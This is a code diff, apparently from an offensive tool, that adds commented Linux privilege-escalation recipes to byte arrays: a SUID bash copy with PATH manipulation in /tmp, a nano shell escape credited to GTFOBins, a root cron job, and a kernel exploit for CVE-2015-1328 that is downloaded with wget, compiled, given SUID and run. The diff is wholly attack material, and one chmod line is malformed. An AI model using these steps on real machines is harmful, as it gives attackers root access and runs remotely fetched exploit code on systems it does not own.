@@ -23,20 +23,34 @@
 
 // define scripts
 uint8_t binaryEsc[100] {
-
+    // cd /tmp
+    // echo "/bin/bash" > exp
+    // chmod x+s exp 
+    // export PATH=$PATH:/tmp
+    // ./exp
 }
 
+/**
+ * for this exploit we leverage lazy privileges for nano, but again we can change this probably to another binary...
+ * 
+ * exploit source: https://gtfobins.github.io/gtfobins/nano
+*/
 uint8_t suidEsc[100] {
-
+    // nano
+    // ^R^X
+    // reset; sh 1>&0 2>&0
 }
 uint8_t cronEsc[100] {
-
+    // cd /home
+    // echo "/bin/bash" > cron.sh
+    // echo "* * * * * root /home/cron.sh"
 }
 uint8_t kernelExp[100] {
     // cd /tmp
     // wget https://raw.githubusercontent.com/SecWiki/linux-kernel-exploits/master/2015/CVE-2015-1328/37292.c
     // gcc 37292.c -o kernelExp
     // chmod +s kernelExp
+    // ./kernelExp
 }
 
 // attack creates a binary then runs it in the /tmp directory
